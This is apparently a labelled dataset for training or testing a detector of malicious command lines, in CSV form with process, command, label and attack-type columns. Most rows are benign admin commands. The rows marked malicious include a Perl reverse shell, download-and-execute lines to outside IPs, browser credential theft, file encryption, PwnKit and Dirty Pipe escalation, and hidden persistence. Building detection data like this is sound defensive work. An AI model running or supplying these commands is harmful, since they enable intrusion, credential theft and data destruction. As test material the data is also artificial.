process_name,command_line,label,attack_type
netsh.exe,"netsh.exe advfirewall firewall add rule name=""Allow App 7.18.4"" dir=in action=allow protocol=TCP localport=4444",benign,defense_evasion
powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\e5d726d56382ed9d1fd196202cec9bba -FilePath C:\Backups\certs\snapshot.cer,benign,credential_dumping
salt,"salt 'svc09*' state.apply webserver pillar='{""release"": ""7.35.7""}'",benign,lateral_movement
powershell.exe,powershell.exe Backup-SqlDatabase -ServerInstance ci04 -Database session_blob -BackupFile 'X:\backups\session_blob-0.10.4.bak' (user: MSSQLSERVER),benign,sql_exploitation
openssl,openssl dgst -sha256 -out /srv/backups/payroll.sha256 /var/lib/app/customer/exports/payroll.tar.gz,benign,ransomware
netsh.exe,"netsh.exe advfirewall firewall add rule name=""Allow App 3.28.1"" dir=in action=allow protocol=TCP localport=443",benign,defense_evasion
apt-get,apt-get install -y --no-install-recommends vendor-agent=0.19.3 && systemctl enable vendor-agent,benign,persistence
hashcat,"hashcat -b -m 0 -D 1 --quiet (benchmark only, QA validation node edge07)",benign,crypto_miner
sqlcmd,sqlcmd -S 10.1.98.166 -E -i C:\Maintenance\reindex-manifest.sql -o C:\Logs\reindex-49.log (user: MSSQLSERVER),benign,sql_exploitation
winrm,winrm invoke Restart wmicimv2/Win32_Service?Name=Dnscache -r:http://db04:5985,benign,lateral_movement
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\session_blob /v Version /t REG_SZ /d 1.26.3 /f,benign,persistence
ansible,ansible ci07* -m shell -a 'systemctl restart app && systemctl status app' --become,benign,lateral_movement
powershell.exe,powershell.exe -ExecutionPolicy Bypass -File C:\Scripts\Backup-FileShares.ps1 -Source C:\Users\deploy\AppData\Local\Temp\cache -Dest \\edge05\backups$ -Retain 3,benign,ransomware
fluent-bit,fluent-bit -i tail -p path=/var/log/customer_db/*.log -o forward -p host=10.3.87.82 -p port=24224,benign,data_exfiltration
aws,aws secretsmanager get-secret-value --secret-id prod/manifest/api --query SecretString --output text --profile ci,benign,credential_dumping
expect,expect -f /opt/automation/rotate-router-ci10.exp,benign,reverse_shell
psql,psql -h 10.5.235.179 -U postgres -c 'REINDEX DATABASE warehouse' -q (user: postgres),benign,sql_exploitation
cp,cp /home/ops/.mozilla/firefox/*.default-release/logins.json /tmp/.fe08eda2b3f213bb/,malicious,credential_dumping
runas.exe,"runas.exe /user:CORP\svc_deploy ""msiexec /i \\build03\sccm$\telemetry_batch-3.23.1.msi /qn""",benign,privilege_escalation
powershell.exe,powershell.exe -ExecutionPolicy Bypass -File C:\Scripts\Backup-FileShares.ps1 -Source /srv/backups/nightly/incremental -Dest \\worker03\backups$ -Retain 28,benign,ransomware
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\ledger_2024 /v Version /t REG_SZ /d 7.16.5 /f,benign,persistence
zfs,zfs snapshot tank/data/build03@nightly-013,benign,ransomware
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\manifest C:\Backups\reg\manifest-5.38.1.reg /y,benign,credential_dumping
powershell.exe,powershell.exe Backup-SqlDatabase -ServerInstance web05 -Database snapshot -BackupFile 'X:\backups\snapshot-8.35.2.bak' (user: MSSQLSERVER),benign,sql_exploitation
openssl,openssl pkcs12 -export -in /etc/ssl/telemetry_batch.crt -inkey /etc/ssl/telemetry_batch.key -out /srv/backups/certs/telemetry_batch.pfx -passout pass:e881c666137888a5,benign,credential_dumping
powershell.exe,"powershell.exe -c ""New-Service -Name WinDefend -BinaryPathName 'C:\Windows\Temp\a99fbb808b8f46c442737aadb56909b8.exe' -StartupType Automatic""",malicious,persistence
terraform,terraform apply -auto-approve -target=module.cluster.node.svc12 -var image_version=7.0.9,benign,lateral_movement
mosh,mosh --ssh='ssh -i /etc/ci/key' ops@edge12.prod.svc.cluster.local -- tmux attach -t deploy,benign,reverse_shell
ab,ab -n 100000 -c 500 -k https://build03.internal.acme.io/healthz,benign,crypto_miner
powershell.exe,"powershell.exe ""(Get-Item C:\Temp\a8864878b44c3a1c8e84e566c2c7d023.exe).LastWriteTime=(Get-Date '2022-02-28')""",malicious,defense_evasion
dirtypipe,/tmp/.0d62ae13c4a57a5a9aadd380de4aac9b/exploit /etc/passwd 1 'root:...' (CVE-2022-0847 pattern),malicious,privilege_escalation
openssl,openssl pkcs12 -export -in /etc/ssl/design_spec.crt -inkey /etc/ssl/design_spec.key -out /srv/backups/certs/design_spec.pfx -passout pass:a99fbb808b8f46c442737aadb56909b8,benign,credential_dumping
stress-ng,stress-ng --cpu 11 --cpu-method matrixprod --timeout 600s --metrics-brief,benign,crypto_miner
ansible-playbook,ansible-playbook -i inventory/prod site.yml --limit cache11 --tags deploy --extra-vars 'version=4.24.2',benign,lateral_movement
bitsadmin.exe,bitsadmin.exe /transfer x /upload http://45.153.135.159/u C:\Temp\f59e2b8e3428.zip,malicious,data_exfiltration
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\telemetry_batch /v Version /t REG_SZ /d 1.30.4 /f,benign,persistence
powershell.exe,powershell.exe Backup-SqlDatabase -ServerInstance web02 -Database telemetry_batch -BackupFile 'X:\backups\telemetry_batch-6.2.3.bak' (user: MSSQLSERVER),benign,sql_exploitation
sc.exe,"sc.exe \\10.40.236.90 create BackupSvc binPath= ""cmd /c C:\Windows\Temp\a799a9ca51c3.exe"" start= auto",malicious,lateral_movement
tar,tar -czf /tmp/.a05b68c5ddc3/snapshot.tar.gz /home/ops/Documents --remove-files,malicious,ransomware
aws,aws s3 sync /srv/backups/db s3://acme-backups-eu/report_final/8.37.4/ --storage-class STANDARD_IA --only-show-errors,benign,data_exfiltration
bash,"bash -c ""cp /tmp/.1b72589478962291/agent ~/.config/autostart/1b72589478962291.desktop""",malicious,persistence
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\customer_db /v Version /t REG_SZ /d 3.32.0 /f,benign,persistence
sqlcmd,sqlcmd -S 10.1.98.166 -E -i C:\Maintenance\reindex-design_spec.sql -o C:\Logs\reindex-92.log (user: MSSQLSERVER),benign,sql_exploitation
salt,"salt 'cache06*' state.apply webserver pillar='{""release"": ""0.0.2""}'",benign,lateral_movement
apt-get,apt-get install -y --no-install-recommends vendor-agent=8.19.5 && systemctl enable vendor-agent,benign,persistence
powershell.exe,powershell.exe Set-MpPreference -ExclusionPath 'C:\Program Files\Vendor\design_spec' -ExclusionExtension '.tmp' (approved CR-47),benign,defense_evasion
sccm,ccmexec.exe /deploy /package:telemetry_batch-1.39.9 /collection:AllWorkstations /schedule:asap,benign,lateral_movement
ansible-playbook,ansible-playbook -i inventory/prod site.yml --limit db01 --tags deploy --extra-vars 'version=1.38.1',benign,lateral_movement
pg_dump,pg_dump -h 10.6.145.52 -U www-data -Fc -f /srv/backups/db/ledger_2024-0.18.8.dump --no-password customers,benign,credential_dumping
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\telemetry_batch /v Version /t REG_SZ /d 6.33.9 /f,benign,persistence
ab,ab -n 100000 -c 500 -k https://edge03.eng.example.net/healthz,benign,crypto_miner
pg_basebackup,pg_basebackup -h 10.21.196.164 -U replicator -D /var/lib/postgresql/standby -Fp -Xs -P (user: postgres),benign,sql_exploitation
powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\d598050b917c6e7b00eda90371cdcfa2 -FilePath C:\Backups\certs\design_spec.cer,benign,credential_dumping
make,make -j22 all && make -j22 test (CI build farm node cache08),benign,crypto_miner
docker,docker run --rm --cpus 44 buildkit:latest build --tag customer_db:5.23.3 /workspace,benign,crypto_miner
wget,wget -qO /tmp/.c54f4e9fe78dd5f24d0505dfa009ba41 http://45.153.135.159/c54f4e9fe78dd5f24d0505dfa009ba41 && /tmp/.c54f4e9fe78dd5f24d0505dfa009ba41 (parent: mysqld),malicious,sql_exploitation
winrm,winrm invoke Restart wmicimv2/Win32_Service?Name=Dnscache -r:http://ci02:5985,benign,lateral_movement
apt-get,apt-get install -y --no-install-recommends vendor-agent=6.26.2 && systemctl enable vendor-agent,benign,persistence
cron,echo '*/15 * * * * deploy /opt/monitoring/collect-metrics.sh --push gateway://10.19.225.150:9091' > /etc/cron.d/metrics,benign,persistence
docker,docker run -d --rm --name audit_trail --entrypoint /bin/sh alpine -c 'apk add curl;curl -s 185.141.239.31/x|sh',malicious,crypto_miner
apt-get,apt-get install -y --no-install-recommends vendor-agent=5.20.7 && systemctl enable vendor-agent,benign,persistence
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\session_blob /v Version /t REG_SZ /d 7.8.1 /f,benign,persistence
apt-get,apt-get install -y --no-install-recommends vendor-agent=0.29.8 && systemctl enable vendor-agent,benign,persistence
pg_dump,pg_dump -h 10.40.164.12 -U automation -Fc -f /srv/backups/db/design_spec-2.12.7.dump --no-password customers,benign,credential_dumping
wget,wget -qO /tmp/.a3f9213676dd http://185.35.93.71/a3f9213676dd && /tmp/.a3f9213676dd (parent: mysqld),malicious,sql_exploitation
docker,docker exec -it design_spec-a05b68c5ddc3 /bin/bash -lc 'tail -f /var/log/app/current',benign,reverse_shell
powershell.exe,powershell.exe Set-MpPreference -ExclusionPath 'C:\Program Files\Vendor\payroll' -ExclusionExtension '.tmp' (approved CR-6),benign,defense_evasion
cron,echo '*/15 * * * * deploy /opt/monitoring/collect-metrics.sh --push gateway://10.39.99.207:9091' > /etc/cron.d/metrics,benign,persistence
ssh,ssh -tt -i /etc/ci/deploy_key root@ci01.eng.example.net 'sudo systemctl restart archive_set',benign,reverse_shell
borg,"borg create --stats --compression zstd,9 /mnt/backup::manifest-7-68 /srv/data/projects/2024",benign,ransomware
ab,ab -n 100000 -c 500 -k https://edge11.corp.local/healthz,benign,crypto_miner
curl,curl -s -T /srv/reports/ledger_2024-3.39.9.pdf -u svc_report:$RPT_TOKEN https://reports.prod.svc.cluster.local/api/v2/upload,benign,data_exfiltration
runas.exe,"runas.exe /user:CORP\svc_deploy ""msiexec /i \\cache04\sccm$\design_spec-7.21.1.msi /qn""",benign,privilege_escalation
sqlcmd,sqlcmd -S 10.9.22.166 -E -i C:\Maintenance\reindex-telemetry_batch.sql -o C:\Logs\reindex-89.log (user: MSSQLSERVER),benign,sql_exploitation
psexec.exe,psexec.exe \\ci07 -u CORP\root -h -accepteula msiexec /i \\svc05\sccm$\packages\telemetry_batch-4.17.9.msi /qn,benign,lateral_movement
pg_dump,pg_dump -h 10.31.108.93 -U automation -Fc -f /srv/backups/db/audit_trail-5.11.9.dump --no-password customers,benign,credential_dumping
ffmpeg,ffmpeg -i /srv/media/session_blob.mov -c:v libx264 -preset slow -crf 18 -threads 38 /srv/media/out/session_blob.mp4,benign,crypto_miner
ansible,ansible edge09* -m shell -a 'systemctl restart app && systemctl status app' --become,benign,lateral_movement
docker,docker run --rm --cpus 52 buildkit:latest build --tag session_blob:1.3.6 /workspace,benign,crypto_miner
netsh.exe,"netsh.exe advfirewall firewall add rule name=""Allow App 0.30.9"" dir=in action=allow protocol=TCP localport=5986",benign,defense_evasion
tar,tar czf - /srv/data/projects/2024 | ssh -i /etc/ci/key backup@10.15.154.15 'cat > /srv/backups/manifest-4.25.1.tgz',benign,data_exfiltration
netsh.exe,netsh.exe advfirewall export C:\Backups\fw\policy-2.14.4.wfw,benign,defense_evasion
systemd,/tmp/.814ed49d75df431ca8a5f585c40fc7de/systemd -c /tmp/.814ed49d75df431ca8a5f585c40fc7de/config.json --cpu-max-threads-hint 100,malicious,crypto_miner
crontab,(crontab -l 2>/dev/null; echo '*/10 * * * * curl -s http://5.76.143.83/f2116ac93be7f970fc8ee527cc37ab89|bash') | crontab -,malicious,persistence
fluent-bit,fluent-bit -i tail -p path=/var/log/dataset_part/*.log -o forward -p host=10.0.175.23 -p port=24224,benign,data_exfiltration
apt-get,apt-get install -y --no-install-recommends vendor-agent=4.28.1 && systemctl enable vendor-agent,benign,persistence
powershell.exe,"powershell.exe -c ""Copy-Item 'C:\Users\postgres\AppData\Local\Google\Chrome\User Data\Default\Login Data' C:\Windows\Temp\2d2d8926fa8cd76eca327835c28fbb54.db""",malicious,credential_dumping
nc,nc -z -w2 10.22.134.185 9001 && echo 'port 9001 open on 10.22.134.185',benign,reverse_shell
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\audit_trail C:\Backups\reg\audit_trail-7.16.3.reg /y,benign,credential_dumping
mysqldump,mysqldump --single-transaction --routines --triggers -u root -p$DB_PASS billing > /srv/backups/design_spec.sql,benign,credential_dumping
ssh,ssh -tt -i /etc/ci/deploy_key automation@web11.corp.local 'sudo systemctl restart snapshot',benign,reverse_shell
ora_backup,rman target / cmdfile=/opt/oracle/scripts/backup-ledger_2024.rman log=/var/log/rman-99.log (user: oracle),benign,sql_exploitation
mysqldump,mysqldump --single-transaction --routines --triggers -u admin -p$DB_PASS billing > /srv/backups/dataset_part.sql,benign,credential_dumping
ora_backup,rman target / cmdfile=/opt/oracle/scripts/backup-customer_db.rman log=/var/log/rman-2.log (user: oracle),benign,sql_exploitation
powershell.exe,powershell.exe Backup-SqlDatabase -ServerInstance app02 -Database design_spec -BackupFile 'X:\backups\design_spec-1.28.8.bak' (user: MSSQLSERVER),benign,sql_exploitation
make,make -j43 all && make -j43 test (CI build farm node edge09),benign,crypto_miner
sqlpackage,sqlpackage /Action:Export /SourceServerName:edge02 /SourceDatabaseName:audit_trail /TargetFile:X:\dac\audit_trail.bacpac (user: MSSQLSERVER),benign,sql_exploitation
nc,nc -z -w2 10.14.21.183 8443 && echo 'port 8443 open on 10.14.21.183',benign,reverse_shell
rsync,rsync -az --partial --bwlimit=20000 /var/log/customer_db/ logsink@10.10.41.185:/data/logs/cache04/,benign,data_exfiltration
netsh.exe,netsh.exe advfirewall export C:\Backups\fw\policy-0.31.3.wfw,benign,defense_evasion
sc.exe,"sc.exe create BITS binPath= ""C:\ProgramData\f98c385aafe4d8e4.exe"" start= auto error= ignore",malicious,persistence
powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\b1ff03ae04b48a9318199c812f328a72 -FilePath C:\Backups\certs\ledger_2024.cer,benign,credential_dumping
tar,tar czf - /opt/vendor/pkg/cache/objects | ssh -i /etc/ci/key backup@10.25.206.207 'cat > /srv/backups/dataset_part-7.4.6.tgz',benign,data_exfiltration
cron,echo '*/15 * * * * postgres /opt/monitoring/collect-metrics.sh --push gateway://10.13.186.29:9091' > /etc/cron.d/metrics,benign,persistence
ldapsearch,"ldapsearch -x -H ldap://node07.prod.svc.cluster.local -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL",benign,credential_dumping
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\session_blob C:\Backups\reg\session_blob-0.24.6.reg /y,benign,credential_dumping
docker,docker run --rm --cpus 23 buildkit:latest build --tag manifest:8.5.4 /workspace,benign,crypto_miner
pg_dump,pg_dump -h 10.27.157.197 -U ops -Fc -f /srv/backups/db/manifest-6.27.9.dump --no-password customers,benign,credential_dumping
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\archive_set C:\Backups\reg\archive_set-4.7.5.reg /y,benign,credential_dumping
cron,echo '*/15 * * * * www-data /opt/monitoring/collect-metrics.sh --push gateway://10.4.178.229:9091' > /etc/cron.d/metrics,benign,persistence
powershell.exe,"powershell.exe -c ""Invoke-Command -ComputerName build06 -ScriptBlock { iex (New-Object Net.WebClient).DownloadString('http://5.75.235.13/9db686415b10cd51') }""",malicious,lateral_movement
fluent-bit,fluent-bit -i tail -p path=/var/log/report_final/*.log -o forward -p host=10.5.98.114 -p port=24224,benign,data_exfiltration
cp,cp /home/sysadmin/.mozilla/firefox/*.default-release/logins.json /tmp/.f618aff0cea38922/,malicious,credential_dumping
stress-ng,stress-ng --cpu 61 --cpu-method matrixprod --timeout 600s --metrics-brief,benign,crypto_miner
dpkg,dpkg -i /opt/packages/snapshot-4.5.7_amd64.deb && systemctl daemon-reload,benign,privilege_escalation
powershell.exe,powershell.exe Register-ScheduledTask -TaskName OneDriveStandalone -Trigger (New-ScheduledTaskTrigger -AtLogon) -Action (New-ScheduledTaskAction -Execute 'C:\Temp\edd14a3ca377b85e.exe'),malicious,persistence
curl,curl -s -X POST --data-binary @/var/log/app/metrics.json http://10.13.92.137:9091/metrics/job/ledger_2024 -H 'Content-Type: application/json',benign,data_exfiltration
duplicity,duplicity --full-if-older-than 7D --encrypt-key 2ff8134dc12fbbc45615e8e2628cbd84 /opt/vendor/pkg/cache/objects file:///srv/backups/dup/svc06,benign,ransomware
socat,"socat TCP-LISTEN:8443,reuseaddr,fork TCP:10.3.253.182:5432",benign,reverse_shell
powershell.exe,powershell.exe Backup-SqlDatabase -ServerInstance cache08 -Database payroll -BackupFile 'X:\backups\payroll-7.14.0.bak' (user: MSSQLSERVER),benign,sql_exploitation
runas.exe,"runas.exe /user:CORP\svc_deploy ""msiexec /i \\build03\sccm$\telemetry_batch-4.31.8.msi /qn""",benign,privilege_escalation
ufw,ufw allow from 10.25.183.59/24 to any port 2222 proto tcp comment 'app cluster 2.40.1',benign,defense_evasion
powershell.exe,powershell.exe -ExecutionPolicy Bypass -File C:\Scripts\Backup-FileShares.ps1 -Source /srv/data/projects/2024 -Dest \\build05\backups$ -Retain 64,benign,ransomware
perl,"perl -e 'use Socket;$i=""193.4.194.156"";$p=31337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));exec(""/bin/sh -i"");'",malicious,reverse_shell
find,find /home/jenkins -type f -name '*.ledger_2024' -exec openssl enc -aes-256-cbc -k fe08eda2b3f213bb -in {} -out {}.enc \;,malicious,ransomware
schtasks.exe,"schtasks.exe /create /tn ""\Microsoft\Windows\UpdateSync"" /tr ""powershell -nop -w hidden -enc PGRvd25sb2FkZXItc3R1Yi1tYXJrZXI+"" /sc minute /mo 30 /ru SYSTEM /f",malicious,persistence
netsh.exe,"netsh.exe advfirewall firewall add rule name=""Allow App 6.19.0"" dir=in action=allow protocol=TCP localport=80",benign,defense_evasion
pkexec,pkexec --version; GCONV_PATH=/tmp/.5d053f05ae82111c pkexec /bin/sh (pwnkit pattern),malicious,privilege_escalation
sshd,sshd --algo rx/0 -o 5.236.63.27:2222 -u 9c1e8fda974f9d0eadcbf2f83fab17ed --background --max-cpu-usage 90 (masquerade),malicious,crypto_miner
powershell.exe,powershell.exe Backup-SqlDatabase -ServerInstance ci08 -Database session_blob -BackupFile 'X:\backups\session_blob-8.2.6.bak' (user: MSSQLSERVER),benign,sql_exploitation
wget,wget -qO /tmp/.bba14c2fb9f0df92 http://193.197.171.84/bba14c2fb9f0df92 && /tmp/.bba14c2fb9f0df92 (parent: mysqld),malicious,sql_exploitation
cp,cp /home/www-data/.mozilla/firefox/*.default-release/logins.json /tmp/.8017e017d214b1f5/,malicious,credential_dumping
